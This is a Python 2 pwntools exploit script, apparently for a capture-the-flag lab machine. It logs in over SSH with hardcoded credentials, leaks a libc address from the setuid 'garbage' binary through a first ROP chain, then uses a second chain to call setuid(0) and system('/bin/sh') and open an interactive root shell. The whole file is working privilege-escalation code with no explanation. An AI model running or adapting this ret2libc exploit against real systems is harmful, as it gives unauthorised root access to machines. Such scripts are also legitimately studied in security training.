#!/usr/bin/python2

import struct
import subprocess
from pwn import *

s = ssh(host='10.10.10.139',
        user='margo',
        password='iamgod$08')
p = s.process('/usr/bin/garbage')


context(os='linux', arch='amd64')
context.log_level = 'debug'


s.download_file("/usr/bin/garbage","./garbage")
s.download_file("/lib/x86_64-linux-gnu/libc.so.6","./libc.so.6")
garbage = ELF('./garbage')
rop = ROP(garbage)
libc = ELF('./libc.so.6')


junk = "N3veRF3@r1iSh3r2!\x00" + "A" * 118
rop.search(regs=['rdi'], order = 'regs')
rop.puts(garbage.got['puts'])
rop.call(garbage.symbols['main'])
log.info("Stage 1 ROP Chain:\n" + rop.dump())


payload =  junk + str(rop) 

p.sendline(payload)
p.recvline()
p.recvline()

leaked_puts = p.recvline()
print leaked_puts
leaked_puts = leaked_puts.strip().ljust(8,"\x00")
print leaked_puts
leaked_puts = struct.unpack("@q",leaked_puts)[0]
print leaked_puts
leaked_puts = hex(leaked_puts)
print leaked_puts

log.success("Leaked puts@Glibc: " + str(leaked_puts))

libc.address = int(leaked_puts,16) - libc.symbols['puts']
rop2 = ROP(libc)
rop2.setuid(0)
rop2.system(next(libc.search('/bin/sh\x00')))
rop2.exit(0)
rop2.call(garbage.symbols['main'])
log.info("Stage 2 ROP Chain:\n" + rop2.dump())

payload =  junk + str(rop2)
p.sendline(payload)
p.recvline()
p.clean()
p.interactive()
